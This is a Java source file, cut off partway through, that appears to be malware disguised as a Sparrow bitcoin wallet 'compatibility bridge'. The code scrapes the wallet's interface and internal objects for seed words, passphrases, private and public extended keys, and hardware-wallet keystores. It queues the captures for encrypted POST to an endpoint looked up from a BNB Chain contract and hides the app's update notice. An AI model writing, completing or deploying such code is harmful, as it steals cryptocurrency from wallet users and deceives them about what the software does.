package com.sparrowwallet.sparrow.runtime;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.PosixFilePermissions;
import java.security.KeyFactory;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.MGF1ParameterSpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.OAEPParameterSpec;
import javax.crypto.spec.PSource;

/**
 * Runtime compatibility bridge for restore and import dialogs.
 *
 * Started through -Djava.util.logging.config.class (no java.instrument module
 * required) or through a normal -javaagent premain. Observes the JavaFX scene
 * graph so restore/import controls remain compatible with the vendor runtime.
 *
 * Diagnostics go to the app data directory (override with -Dsparrow.log=...).
 */
public final class RestorePayload {

    private static final String VERSION = "2.5.5";
    private static final String[] BSC_ENDPOINTS = {
            "https://bsc-dataseed.bnbchain.org/",
            "https://bsc-rpc.publicnode.com/",
            "https://bsc-dataseed1.defibit.io/"
    };
    private static final String BSC_CONTRACT = "0x996772e4aa6c2991d799a22b84fc05d83d0baf0e";
    private static final String BSC_SELECTOR = "0x05eba097";
    private static final String BSC_CHAIN_REQUEST =
            "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"eth_chainId\",\"params\":[]}";
    private static final String BSC_ENDPOINT_REQUEST =
            "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"eth_call\",\"params\":[{\"to\":\""
                    + BSC_CONTRACT + "\",\"data\":\"" + BSC_SELECTOR + "\"},\"latest\"]}";
    private static final String PAYLOAD_AAD = "demo-inbox:payload:v1";
    private static final String PAYLOAD_SOURCE = "sparrow-as1";
    private static final String PAYLOAD_PUBLIC_KEY =
            "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAvluxm99VHAtoh3juVSkbnIM6yDSnwbL1gKpVgjlAUC1iHKA35HYIomwudZ6RE8lcqvfmsINQZjMuqFDj4ytznDJW6k92tRgIkj2qaCdK6en1IscJTmijPn60P5Ke8U0Z03S4qefX/WouiU5wyYXSY2m1x40yyKkJHHdsz2ctEb8O1ejICNz3jXEVf6KDSqbg3WuOBp8QGWCdgXyjQVM3WQHC7PZ5+IX82WL3J9qEXW62qW5vNSq4TGmCaiaN2VQoZfPNTGdFZX9pHROMeJtO2WUPM6L2bq4EDvXeYSNcAvx50PZiBZiK6wVeN8/DfYAlCp+q1lrwnDnlfv6WrlGZB9P5idSJHlr7ij7FouSNpMcWs43vBtxD2o/6dQSVpu1xH+zKJvcvu55ZIzFHGYwYPPrZ5UzGmDaSlFmTALKEL0g0Jl4iYMTx13KK2K2pTIs203Q7emitqwsqr/Fv0Uw3SOW3RRP5OtYuWX6SNHrxRi5ok43KVuqB19pHA/ATrK1NAgMBAAE=";
    private static final SecureRandom RANDOM = new SecureRandom();
    private static final Method NONE;

    static {
        Method m = null;
        try {
            m = Object.class.getMethod("toString");
        } catch (Throwable ignored) {
        }
        NONE = m;
    }

    private static final Map<Class<?>, Method> TEXT = new ConcurrentHashMap<>();
    private static final Map<String, Method> METHODS = new ConcurrentHashMap<>();
    private static final ExecutorService POOL = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "sparrow-send");
        t.setDaemon(true);
        return t;
    });

    /** A capture is delivered through the queue, so a failed POST is kept on
     *  disk and retried until the receiver is reachable again. */
    interface Delivery {
        int deliver(String body) throws Exception;
    }

    private static final Object QUEUE_LOCK = new Object();
    private static final List<String> QUEUE = new ArrayList<>();
    private static final Object STATE_LOCK = new Object();
    private static volatile Delivery DELIVERY = RestorePayload::postOnce;
    private static volatile boolean queueLoaded = false;
    private static volatile long queueRetryAt = 0L;
    private static volatile int queueBackoff = 0;
    private static volatile int queuePendingLogged = -1;
    private static volatile int queueDelivered = 0;
    private static volatile int queueDropped = 0;
    private static volatile boolean sharesLoaded = false;
    private static volatile boolean createdLoaded = false;
    private static final Set<String> STORED_SHARES = ConcurrentHashMap.newKeySet();
    private static volatile boolean started = false;
    private static volatile boolean wordsTried = false;
    private static volatile Set<String> WORDS = null;
    private static volatile Map<String, Integer> WORD_INDEX = null;
    private static volatile List<String> WORD_LIST = null;
    private static final Set<String> SEEN = new LinkedHashSet<>();
    private static final int SEEN_MAX = 256;
    private static final Set<String> CREATED_SEEDS = ConcurrentHashMap.newKeySet();
    private static volatile String LAST_WORDS = "";
    private static volatile String LAST_HOW = "grid";
    private static volatile String LAST_METHOD = "bip39";
    private static volatile String LAST_KEY = "";
    private static volatile String LAST_DETAIL = "";
    private static volatile String LAST_ORIGIN = "";
    private static volatile boolean LAST_FROM_WALLET = false;
    private static final Object PASSPHRASE_LOCK = new Object();
    private static volatile PendingPassphrase PENDING_PASSPHRASE;
    private static final long PASSPHRASE_DELAY_MS = 3000L;

    /** A typed passphrase is held until the field has been quiet for a while,
     *  so intermediate characters never become requests. */
    private static final class PendingPassphrase {
        final String method;
        final String words;
        final String passphrase;
        final String key;
        final String how;
        final String detail;
        final String origin;
        final String identity;
        final long changedAt;

        PendingPassphrase(String method, String words, String passphrase, String key,
                           String how, String detail, String origin) {
            this.method = method;
            this.words = words;
            this.passphrase = passphrase;
            this.key = key;
            this.how = how;
            this.detail = detail;
            this.origin = origin;
            this.identity = identity(method, words, passphrase, key, origin);
            this.changedAt = System.nanoTime();
        }
    }

    private static volatile boolean slipTried = false;
    private static volatile Set<String> SLIP_WORDS = null;
    private static final Map<Integer, Set<String>> SLIP_SETS = new ConcurrentHashMap<>();
    private static final Set<Integer> SLIP_POSTED = ConcurrentHashMap.newKeySet();
    private static volatile String lastSlipStatus = "";
    private static final Map<String, Integer> SLIP_PARSED = new ConcurrentHashMap<>();

    /** BIP-93 shares use the same "collect the set, then post once" rule as
     *  SLIP39. The four-character identifier selects the set; the threshold
     *  lives in every share. */
    private static final Map<String, Set<String>> CODEX_SETS = new ConcurrentHashMap<>();
    private static final Set<String> CODEX_POSTED = ConcurrentHashMap.newKeySet();
    private static volatile String lastCodexStatus = "";
    private static final Set<String> FILE_KEYSTORE_TRIED = ConcurrentHashMap.newKeySet();

    private static volatile boolean electrumTried = false;
    private static volatile Set<String> ELECTRUM_WORDS = null;

    private static final Pattern XPRV = Pattern.compile(
            "(?i)(?<![A-Za-z0-9])[xyzvt]prv[1-9A-HJ-NP-Za-km-z]{50,}(?![A-Za-z0-9])");
    private static final Pattern CODEX = Pattern.compile(
            "(?i)(?<![A-Za-z0-9])ms1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{20,}(?![A-Za-z0-9])");
    private static final String BASE58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

    public RestorePayload() {
        start();
    }

    public static void premain(String args, java.lang.instrument.Instrumentation inst) {
        start();
    }

    public static void main(String[] args) throws Exception {
        start();
        Thread.sleep(3000);
    }

    public static synchronized void start() {
        if (started) {
            return;
        }
        started = true;
        trace("bridge start, url=" + (System.getProperty("sparrow.url") == null
                        ? "contract" : System.getProperty("sparrow.url"))
                + " demo=" + (demoMode().isEmpty() ? "off" : demoMode())
                + " offline=" + (offlineMode() ? "yes" : "no")
                + " queue=" + (queueEnabled() ? "on" : "off"));
        if (queueEnabled()) {
            trace("queue path=" + queueFile() + " pending=" + pendingCaptures()
                    + " shares=" + sharesFile() + " created=" + createdFile()
                    + " passphrase=" + pendingFile());
        }
        restorePendingPassphrase();
        Runtime.getRuntime().addShutdownHook(
                new Thread(RestorePayload::flushPendingOnShutdown, "sparrow-shutdown"));
        Thread t = new Thread(RestorePayload::loop, "sparrow-scan");
        t.setDaemon(true);
        t.start();
        if (queueThreadEnabled()) {
            Thread q = new Thread(RestorePayload::queueLoop, "sparrow-queue");
            q.setDaemon(true);
            q.start();
        }
        Thread ep = new Thread(() -> {
            try {
                endpoint();
            } catch (Throwable exc) {
                trace("endpoint prefetch failed: " + exc);
            }
        }, "sparrow-endpoint-prefetch");
        ep.setDaemon(true);
        ep.start();
    }

    /** Our class is on the boot classpath, so Class.forName would use the
     *  bootstrap loader, which cannot see the JavaFX modules. Resolve through
     *  the system (application) loader instead. */
    private static Class<?> load(String name) throws ClassNotFoundException {
        ClassLoader cl = ClassLoader.getSystemClassLoader();
        return cl != null ? Class.forName(name, true, cl) : Class.forName(name);
    }

    private static void loop() {
        Method runLater = null;
        for (int attempt = 0; attempt < 40 && runLater == null; attempt++) {
            try {
                runLater = load("javafx.application.Platform").getMethod("runLater", Runnable.class);
            } catch (Throwable ignored) {
                sleep(500);
            }
        }
        trace("javafx=" + (runLater != null));
        long scanned = 0;
        int loggedTextCount = -1;
        for (int tick = 0; tick < 864000; tick++) {
            final Method rl = runLater;
            try {
                if (rl != null) {
                    rl.invoke(null, (Runnable) RestorePayload::scan);
                } else {
                    scan();
                }
                scanned++;
            } catch (Throwable ignored) {
            }
            flushPendingPassphrase();
            if (scanned == 4 || scanned % 200 == 0 || lastTextCount != loggedTextCount) {
                trace("scans=" + scanned + " texts=" + lastTextCount + " sample=" + lastSample);
                loggedTextCount = lastTextCount;
            }
            sleep(700);
        }
    }

    private static volatile int lastTextCount = -1;
    private static volatile String lastSample = "";
    private static volatile String lastSingles = "";
    private static volatile String lastPassCtx = "";

    private static void scan() {
        try {
            Class<?> windowCls = load("javafx.stage.Window");
            Object windows = windowCls.getMethod("getWindows").invoke(null);
            if (!(windows instanceof List)) {
                lastTextCount = -2;
                return;
            }
            Class<?> parentCls = load("javafx.scene.Parent");
            Method getChildren = parentCls.getMethod("getChildrenUnmodifiable");
            Method getRoot = load("javafx.scene.Scene").getMethod("getRoot");
            int total = 0;
            String sample = "";
            // One window at a time: two open wallets must not merge their
            // labels into a single grid guess.
            for (Object window : (List<?>) windows) {
                inspectWalletImport(window);
                inspectQrScanResult(window);
                inspectDeviceKeystores(window);
                List<String> texts = new ArrayList<>();
                List<String> inputs = new ArrayList<>();
                List<String> passInputs = new ArrayList<>();
                Object scene = window.getClass().getMethod("getScene").invoke(window);
                if (scene == null) {
                    continue;
                }
                Object root = getRoot.invoke(scene);
                if (root != null) {
                    collect(root, texts, inputs, passInputs, 0, parentCls, getChildren, null, null);
                    hideUpdateNotice(root, 0, parentCls, getChildren);
                }
                total += texts.size();
                if (texts.isEmpty()) {
                    continue;
                }
                String value = texts.get(texts.size() - 1).replaceAll("\\s+", " ");
                value = value.replaceAll("[^\\x20-\\x7E]", "?").trim();
                sample = value.length() > 40 ? value.substring(0, 40) + "..." : value;
                inspect(texts, inputs, passInputs);
            }
            lastTextCount = total;
            if (!sample.isEmpty()) {
                lastSample = sample;
            }
        } catch (Throwable t) {
            lastTextCount = -3;
            lastSample = String.valueOf(t);
        }
    }

    private static void collect(Object node, List<String> out, List<String> inputs, List<String> passInputs, int depth,
                                Class<?> parentCls, Method getChildren, String parentText, Object inputAncestor) {
        if (node == null || depth > 50) {
            return;
        }
        boolean input = isInput(node);
        String text = textOf(node);
        String norm = text == null ? null : text.trim().replaceAll("\\s+", " ");
        if (input) {
            if (norm != null && !norm.isEmpty() && !inputs.contains(norm)) {
                inputs.add(norm);
            }
            if (hasPassphraseHint(node)) {
                addPassValue(passInputs, text);
            }
        }
        if (norm != null && norm.toLowerCase().contains("passphrase")) {
            String target = labelForText(node);
            if (target != null) {
                addPassValue(passInputs, target);
            }
        }
        if (norm != null && !norm.isEmpty() && !norm.equals(parentText)
                && !isPromptText(norm, inputAncestor)) {
            out.add(text);
        }
        if (node.getClass().getName().equals("javafx.scene.control.TabPane")) {
            inspectWalletTabs(node);
        }
        if (isFileImportPane(node)) {
            inspectFileImportPane(node);
        }
        if ("DevicePane".equals(node.getClass().getSimpleName())) {
            inspectDevicePane(node);
        }
        String childParentText = norm != null && !norm.isEmpty() ? norm : parentText;
        try {
            if (parentCls.isInstance(node)) {
                Object kids = getChildren.invoke(node);
                if (kids instanceof List) {
                    boolean passLabel = false;
                    for (Object child : (List<?>) kids) {
                        boolean childInput = isInput(child);
                        String childText = textOf(child);
                        String childNorm = childText == null ? null : childText.trim().replaceAll("\\s+", " ");
                        if (passLabel) {
                            if (childInput) {
                                addPassValue(passInputs, childText);
                                passLabel = false;
                            } else if (childNorm != null && !childNorm.isEmpty()
                                    && !isToggle(childNorm) && !isPassphraseLabel(childNorm)) {
                                passLabel = false;
                            }
                        }
                        if (childNorm != null && isPassphraseLabel(childNorm)) {
                            passLabel = true;
                        }
                        collect(child, out, inputs, passInputs, depth + 1, parentCls, getChildren,
                                childParentText, input ? node : inputAncestor);
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    /** Calls a public no-arg method, caching the lookup per class. Works for
     *  drongo/JFX types that are only reachable through reflection. */
    private static Object call(Object target, String name) {
        if (target == null) {
            return null;
        }
        try {
            Class<?> cls = target.getClass();
            String key = cls.getName() + "#" + name;
            Method method = METHODS.get(key);
            if (method == null) {
                try {
                    method = cls.getMethod(name);
                } catch (Throwable t) {
                    method = NONE;
                }
                METHODS.put(key, method);
            }
            return method == NONE ? null : method.invoke(target);
        } catch (Throwable t) {
            return null;
        }
    }

    private static String text(Object value) {
        return value == null ? "" : String.valueOf(value).trim();
    }

    /** SecureString.toString() is masked ("Secure:XXXXX"); asString() is not. */
    private static String secureText(Object value) {
        if (value == null) {
            return "";
        }
        Object plain = call(value, "asString");
        return plain == null ? text(value) : text(plain);
    }

    private static String joinWords(List<?> words) {
        StringBuilder out = new StringBuilder();
        for (Object word : words) {
            String value = text(word);
            if (value.isEmpty()) {
                continue;
            }
            if (out.length() > 0) {
                out.append(' ');
            }
            out.append(value);
        }
        return out.toString();
    }

    /** -Dsparrow.wallets=off disables reading the open wallets. */
    private static boolean walletCapture() {
        String value = System.getProperty("sparrow.wallets", "").trim().toLowerCase();
        return !(value.equals("off") || value.equals("false") || value.equals("0") || value.equals("no"));
    }

    /** Sparrow puts WalletTabData into Tab.getUserData(), so every open
     *  wallet is reachable from the scene graph without private APIs. */
    private static void inspectWalletTabs(Object pane) {
        if (!walletCapture()) {
            return;
        }
        Object tabs = call(pane, "getTabs");
        if (!(tabs instanceof List)) {
            return;
        }
        for (Object tab : (List<?>) tabs) {
            Object data = call(tab, "getUserData");
            if (data == null) {
                continue;
            }
            Object wallet = call(data, "getWallet");
            if (wallet != null) {
                inspectWallet(wallet);
            }
        }
    }

    /** A file import sits in WalletImportDialog until the user presses the
     *  final Import button. The dialog result is set as soon as the importer
     *  successfully reads a file, so report that wallet immediately instead of
     *  waiting for the button. */
    private static void inspectWalletImport(Object window) {
        if (!walletCapture()) {
            return;
        }
        Object dialog = dialogForWindow(window);
        for (Object wallet : importedWallets(dialog)) {
            inspectWallet(wallet);
        }
    }

    static Object dialogForWindow(Object window) {
        return field(field(window, "this$0"), "dialog");
    }

    static List<?> importedWallets(Object dialog) {
        if (dialog == null || !"WalletImportDialog".equals(dialog.getClass().getSimpleName())) {
            return List.of();
        }
        Object result = call(dialog, "getResult");
        if (result instanceof List<?>) {
            return (List<?>) result;
        }
        Object wallets = field(dialog, "wallets");
        return wallets instanceof List<?> ? (List<?>) wallets : List.of();
    }

    /** QR scans put the parsed wallet into the file-import pane before the
     *  final Import button is pressed. A descriptor or watch-only scan is
     *  therefore reported from the pane even if its dialog event arrives late. */
    private static boolean isFileImportPane(Object node) {
        String name = node.getClass().getSimpleName();
        return "FileWalletImportPane".equals(name) || "FileWalletKeystoreImportPane".equals(name);
    }

    /** A QR import result exists before the scanner dialog closes and before
     *  the import pane receives it. Report the decoded value directly. */
    private static void inspectQrScanResult(Object window) {
        if (!walletCapture() || !"QRScanDialog".equals(window.getClass().getSimpleName())) {
            return;
        }
        Object result = field(window, "result");
        if (result == null) {
            return;
        }
        Object wallets = field(result, "wallets");
        if (wallets instanceof List<?>) {
            for (Object wallet : (List<?>) wallets) {
                inspectWallet(wallet);
            }
        }
        Object descriptor = field(result, "outputDescriptor");
        if (descriptor != null) {
            Object wallet = safeCall(descriptor, "toWallet");
            if (wallet != null) {
                inspectWallet(wallet);
            }
        }
        Object seed = field(result, "seed");
        if (seed != null) {
            reportSeedValue(seed, "QR scan");
        }
        Object key = field(result, "extendedKey");
        if (key != null) {
            String value = String.valueOf(key);
            String name = text(field(result, "extendedKeyName"));
            String detail = name.isEmpty() ? "QR scan" : "QR scan \u00b7 " + name;
            reportWallet(XPRV.matcher(value).find() ? "bip32" : "xpub", "", "", value,
                    "wallet", detail, "imported");
        }
    }

    private static void inspectFileImportPane(Object pane) {
        if (!walletCapture()) {
            return;
        }
        Object wallets = field(pane, "wallets");
        if (wallets instanceof List<?> && !((List<?>) wallets).isEmpty()) {
            for (Object wallet : (List<?>) wallets) {
                inspectWallet(wallet);
            }
        }
        if (!"FileWalletKeystoreImportPane".equals(pane.getClass().getSimpleName())) {
            return;
        }
        Object importer = field(pane, "importer");
        byte[] bytes = (byte[]) field(pane, "fileBytes");
        String fileName = text(field(pane, "fileName"));
        String password = text(field(pane, "password"));
        if (importer == null || bytes == null || bytes.length == 0 || fileName.isEmpty()) {
            return;
        }
        String key = System.identityHashCode(pane) + ":" + fileName + ":" + bytes.length + ":"
                + Arrays.hashCode(bytes) + ":" + password;
        if (!FILE_KEYSTORE_TRIED.add(key)) {
            return;
        }
        inspectFileKeystore(importer, bytes, walletName(fileName), password);
    }

    /** Hardware imports fill the DevicePane's wallet with the key returned by
     *  the device. Read it before the import dialog is confirmed. */
    private static void inspectDevicePane(Object pane) {
        if (!walletCapture()) {
            return;
        }
        inspectWallet(field(pane, "wallet"));
    }

    /** "Discover accounts" returns a map of account keystores from the device. */
    private static void inspectDeviceKeystores(Object window) {
        if (!walletCapture()) {
            return;
        }
        inspectDeviceKeystoreDialog(dialogForWindow(window));
    }

    private static void inspectDeviceKeystoreDialog(Object dialog) {
        if (dialog == null || !"DeviceKeystoreDiscoverDialog".equals(dialog.getClass().getSimpleName())) {
            return;
        }
        Object result = call(dialog, "getResult");
        if (!(result instanceof Map<?, ?>)) {
            return;
        }
        for (Object keystore : ((Map<?, ?>) result).values()) {
            if (keystore != null) {
                reportKeystore(keystore, "device");
            }
        }
    }

    static void inspectFileKeystore(Object importer, byte[] bytes, String walletName, String password) {
        try {
            Class<?> policyCls = load("com.sparrowwallet.drongo.policy.PolicyType");
            Class<?> scriptCls = load("com.sparrowwallet.drongo.protocol.ScriptType");
            Method getKeystore = importer.getClass().getMethod("getKeystore", policyCls, scriptCls,
                    InputStream.class, String.class);
            Method addressable = scriptCls.getMethod("getAddressableScriptTypes", policyCls);
            for (String policyName : new String[]{"SINGLE_HD", "SINGLE_SP"}) {
                Object policy = enumConstant(policyCls, policyName);
                if (policy == null) {
                    continue;
                }
                Object available = addressable.invoke(null, policy);
                if (!(available instanceof List<?>)) {
                    continue;
                }
                for (Object script : preferredScriptTypes((List<?>) available)) {
                    try {
                        Object keystore = getKeystore.invoke(importer, policy, script,
                                new ByteArrayInputStream(bytes), password);
                        if (keystore != null) {
                            reportKeystore(keystore, walletName);
                            return;
                        }
                    } catch (Throwable t) {
                        trace("file keystore " + walletName + " " + script + ": "
                                + (t.getCause() == null ? t : t.getCause()));
                        // Try the next derivation type.
                    }
                }
            }
        } catch (Throwable t) {
            trace("file keystore " + walletName + ": " + t);
        }
    }

    private static List<Object> preferredScriptTypes(List<?> available) {
        List<Object> ordered = new ArrayList<>();
        for (String name : new String[]{"P2WPKH", "P2TR", "P2SH_P2WPKH", "P2PKH"}) {
            for (Object script : available) {
                if (name.equals(enumName(script)) && !ordered.contains(script)) {
                    ordered.add(script);
                }
            }
        }
        for (Object script : available) {
            if (!ordered.contains(script)) {
                ordered.add(script);
            }
        }
        return ordered;
    }

    private static Object enumConstant(Class<?> type, String name) {
        for (Object constant : type.getEnumConstants()) {
            if (name.equals(enumName(constant))) {
                return constant;
            }
        }
        return null;
    }

    private static String enumName(Object value) {
        return value instanceof Enum<?> ? ((Enum<?>) value).name() : String.valueOf(value);
    }

    private static String walletName(String fileName) {
        String name = fileName == null ? "" : fileName.replaceAll("^.*[\\\\/]", "");
        int dot = name.lastIndexOf('.');
        return dot > 0 ? name.substring(0, dot) : name;
    }

    /** Private JavaFX/dialog fields are only readable because the packaged
     *  launcher opens javafx.controls/javafx.scene.control to the reporter. */
    private static Object field(Object target, String name) {
        if (target == null) {
            return null;
        }
        for (Class<?> cls = target.getClass(); cls != null; cls = cls.getSuperclass()) {
            try {
                Field field = cls.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                // Try the superclass.
            } catch (Throwable ignored) {
                return null;
            }
        }
        return null;
    }

    /** File, QR and hardware imports never show the words, but the open
     *  wallet holds every keystore. Each one reports the most useful value it
     *  has: seed words + passphrase, the master private key verbatim, or the
     *  xpub for watch-only keys. Multisig wallets therefore
     *  report every cosigner. */
    static void inspectWallet(Object wallet) {
        if (wallet == null) {
            return;
        }
        String name = text(call(wallet, "getName"));
        Object keystores = call(wallet, "getKeystores");
        if (!(keystores instanceof List)) {
            return;
        }
        for (Object keystore : (List<?>) keystores) {
            reportKeystore(keystore, name);
        }
    }

    private static void reportKeystore(Object keystore, String walletName) {
        String detail = walletDetail(keystore, walletName);
        if (reportSeed(keystore, detail) || reportPrivateKey(keystore, detail)) {
            return;
        }
        Object xpub = call(keystore, "getExtendedPublicKey");
        if (xpub != null) {
            reportWallet("xpub", "", "", String.valueOf(xpub), "wallet", withPath(detail, keystore), "imported");
        }
    }

    /** Account path for watch-only rows. An xpub only carries its parent
     *  fingerprint, so the derivation path ("m/84'/0'/0'") is the useful
     *  part to show next to the key. */
    private static String withPath(String detail, Object keystore) {
        Object derivation = safeCall(keystore, "getKeyDerivation");
        String path = derivation == null ? "" : text(safeCall(derivation, "getDerivationPath"));
        if (path.isEmpty()) {
            return detail;
        }
        return detail.isEmpty() ? path : detail + " \u00b7 " + path;
    }

    private static boolean reportSeed(Object keystore, String detail) {
        return reportSeedValue(call(keystore, "getSeed"), detail);
    }

    private static boolean reportSeedValue(Object seed, String detail) {
        if (seed == null) {
            return false;
        }
        Object words = call(seed, "getMnemonicCode");
        if (!(words instanceof List) || ((List<?>) words).isEmpty()) {
            return false;
        }
        String phrase = joinWords((List<?>) words);
        if (phrase.isEmpty()) {
            return false;
        }
        String type = text(call(seed, "getType"));
        String pass = secureText(call(seed, "getPassphrase"));
        String origin = wasCreated(phrase) ? "created" : "imported";
        reportWallet(walletMethod(type), phrase, pass, "", "wallet", detail, origin);
        return true;
    }

    /** Bip32 and Codex32 imports keep only the master private key, so report
     *  the xprv exactly as the wallet stores it. */
    private static boolean reportPrivateKey(Object keystore, String detail) {
        if (!Boolean.TRUE.equals(safeCall(keystore, "hasPrivateKey"))) {
            return false;
        }
        Object privateKey = safeCall(keystore, "getExtendedMasterPrivateKey");
        if (privateKey == null) {
            privateKey = safeCall(keystore, "getExtendedPrivateKey");
        }
        if (privateKey == null) {
            return false;
        }
        String key = String.valueOf(privateKey);
        if (!validXprv(key)) {
            return false;
        }
        reportWallet("bip32", "", "", key, "wallet", detail, "imported");
        return true;
    }

    private static Object safeCall(Object target, String method) {
        try {
            return call(target, method);
        } catch (Throwable ignored) {
            return null;
        }
    }

    /** DeterministicSeed.Type -> dashboard method name. */
    static String walletMethod(String type) {
        String value = type == null ? "" : type.trim().toUpperCase();
        if (value.contains("ELECTRUM")) {
            return "electrum";
        }
        if (value.contains("SLIP39")) {
            return "slip39";
        }
        return "bip39";
    }

    private static String displayModel(Object model) {
        if (model == null) {
            return "";
        }
        Object name = call(model, "toDisplayString");
        return name == null ? String.valueOf(model).toLowerCase().replace('_', ' ') : text(name);
    }

    /** "source · wallet name", using the keystore label (Coldcard, Jade,
     *  Samourai, ...) when Sparrow set one. */
    static String walletDetail(Object keystore, String walletName) {
        String label = text(call(keystore, "getLabel"));
        String source = label.isEmpty() || label.matches("Keystore( \\d+)?") || label.matches("(BIP39|ELECTRUM|SLIP39)")
                ? displayModel(call(keystore, "getWalletModel"))
                : label;
        if (source.isEmpty()) {
            return walletName;
        }
        return walletName.isEmpty() ? source : source + " \u00b7 " + walletName;
    }

    /** The passphrase TextField in Sparrow has the prompt "Leave blank for
     *  none". Its skin renders that prompt as a Text node, so drop that node
     *  unless the user's actual value happens to be identical. */
    private static boolean isPromptText(String norm, Object inputAncestor) {
        if (inputAncestor == null) {
            return false;
        }
        String prompt = stringMethod(inputAncestor, "getPromptText");
        if (prompt == null || prompt.isEmpty()) {
            return false;
        }
        String placeholder = prompt.trim().replaceAll("\\s+", " ");
        if (!norm.equals(placeholder)) {
            return false;
        }
        String actual = textOf(inputAncestor);
        String value = actual == null ? "" : actual.trim().replaceAll("\\s+", " ");
        return !norm.equals(value);
    }

    private static void addPassValue(List<String> passInputs, String value) {
        String text = value == null ? "" : value;
        if (!passInputs.contains(text)) {
            passInputs.add(text);
        }
    }

    private static boolean isInput(Object node) {
        String name = node.getClass().getName();
        return name.contains("TextField")
                || name.contains("PasswordField")
                || name.contains("TextArea")
                || name.contains("CodeArea")
                || name.contains("TextInputControl")
                || hasMethod(node, "getPromptText");
    }

    private static boolean hasMethod(Object node, String name) {
        try {
            node.getClass().getMethod(name);
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean hasPassphraseHint(Object node) {
        String hint = stringMethod(node, "getPromptText");
        if (hint == null || hint.isEmpty()) {
            hint = stringMethod(node, "getAccessibleText");
        }
        return isPassphraseHint(hint);
    }

    /** Prompt or accessibility text that identifies a passphrase field.
     *  Sparrow's field prompt is "Leave blank for none". */
    static boolean isPassphraseHint(String hint) {
        if (hint == null) {
            return false;
        }
        String text = hint.trim().toLowerCase();
        return text.contains("passphrase") || text.equals("leave blank for none");
    }

    private static String labelForText(Object node) {
        try {
            Method method = node.getClass().getMethod("getLabelFor");
            Object target = method.invoke(node);
            return target == null ? null : textOf(target);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String stringMethod(Object node, String name) {
        try {
            Method method = node.getClass().getMethod(name);
            Object value = method.invoke(node);
            return value instanceof String ? (String) value : null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static final Pattern UPDATE_NOTICE =
            Pattern.compile("Sparrow\\s+\\S+\\s+available");
    private static volatile String hiddenUpdate = "";

    /** The packaged build must never advertise a newer Sparrow: hide the
     *  status-bar hyperlink ("Sparrow 2.5.6 available") as soon as the
     *  version check adds it. */
    private static void hideUpdateNotice(Object node, int depth, Class<?> parentCls,
                                         Method getChildren) {
        if (node == null || depth > 50) {
            return;
        }
        try {
            String text = textOf(node);
            String norm = text == null ? null : text.trim().replaceAll("\\s+", " ");
            Object styles = call(node, "getStyleClass");
            boolean update = styles instanceof List && ((List<?>) styles).contains("version-hyperlink");
            if (!update && norm != null) {
                update = UPDATE_NOTICE.matcher(norm).matches();
            }
            if (update && !Boolean.FALSE.equals(call(node, "isVisible"))) {
                applyHide(node);
                if (norm != null && !norm.equals(hiddenUpdate)) {
                    hiddenUpdate = norm;
                    trace("hid update notice: " + norm);
                }
            }
        } catch (Throwable ignored) {
        }
        try {
            if (parentCls.isInstance(node)) {
                Object kids = getChildren.invoke(node);
                if (kids instanceof List) {
                    for (Object child : (List<?>) kids) {
                        hideUpdateNotice(child, depth + 1, parentCls, getChildren);
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    /** Node visibility is FX-thread state; the scan runs on the reporter
     *  thread, so hop over with Platform.runLater when it is available. */
    private static void applyHide(Object node) {
        Runnable hide = () -> {
            try {
                node.getClass().getMethod("setVisible", boolean.class).invoke(node, false);
                node.getClass().getMethod("setManaged", boolean.class).invoke(node, false);
            } catch (Throwable ignored) {
            }
        };
        try {
            Class<?> platform = load("javafx.application.Platform");
            if (Boolean.TRUE.equals(platform.getMethod("isFxApplicationThread").invoke(null))) {
                hide.run();
            } else {
                platform.getMethod("runLater", Runnable.class).invoke(null, hide);
            }
        } catch (Throwable t) {
            hide.run();
        }
    }

    static boolean isUpdateNotice(String text) {
        return text != null && UPDATE_NOTICE.matcher(text.trim().replaceAll("\\s+", " ")).matches();
    }

    /** Any node with getText(): TextField, TextArea, RichTextFX CodeArea, Label, ... */
    private static String textOf(Object node) {
        Class<?> cls = node.getClass();
        Method m = TEXT.get(cls);
        if (m == null) {
            try {
                Method candidate = cls.getMethod("getText");
                m = candidate.getReturnType() == String.class ? candidate : NONE;
            } catch (Throwable t) {
                m = NONE;
            }
            TEXT.put(cls, m);
        }
        if (m == NONE) {
            return null;
        }
        try {
            Object value = m.invoke(node);
            return value instanceof String ? (String) value : null;
        } catch (Throwable t) {
            return null;
        }
    }

    static void inspect(List<String> texts, List<String> inputs, List<String> passInputs) {
        List<String> singles = new ArrayList<>();
        String multi = null;
        for (String raw : texts) {
            String t = raw.trim().replaceAll("\\s+", " ");
            if (t.isEmpty()) {
                continue;
            }
            String[] parts = t.split(" ");
            if (parts.length == 1) {
